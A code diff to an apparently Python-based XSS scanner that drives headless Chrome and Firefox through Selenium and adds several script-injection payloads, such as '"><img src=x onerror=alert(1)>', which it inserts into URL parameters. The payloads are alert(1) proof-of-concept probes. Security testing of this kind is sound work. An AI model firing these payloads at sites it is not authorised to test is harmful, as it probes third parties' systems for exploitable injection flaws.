@@ -5,6 +5,8 @@ import logging
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
 from selenium.webdriver.firefox.service import Service as FirefoxService
+from selenium.webdriver.chrome.options import Options as ChromeOptions
+from selenium.webdriver.firefox.options import Options as FirefoxOptions
 
 # تنظیمات logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -32,7 +34,10 @@ def generate_payloads(url, params):
     payloads = [
         '<script>alert(1)</script>',
         '"><script>alert(1)</script>',
-        '<img src=x onerror=alert(1)>'
+        '<img src=x onerror=alert(1)>',
+        '"><img src=x onerror=alert(1)>',
+        '\ "-alert(1)}//',
+        '"alert(1)-/><script>///'
     ]
     
     urls_with_payloads = []
@@ -46,11 +51,18 @@ def check_xss(url, browser):
     logging.info(f'Testing URL: {url} with browser: {browser}')
     
     if browser == 'chrome':
+        chrome_options = ChromeOptions()
+        chrome_options.add_argument('--headless')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
         service = ChromeService()
-        driver = webdriver.Chrome(service=service)
+        driver = webdriver.Chrome(service=service, options=chrome_options)
     elif browser == 'firefox':
+        firefox_options = FirefoxOptions()
+        firefox_options.add_argument('--headless')
         service = FirefoxService()
-        driver = webdriver.Firefox(service=service)
+        driver = webdriver.Firefox(service=service, options=firefox_options)
     
     try:
         driver.get(url)
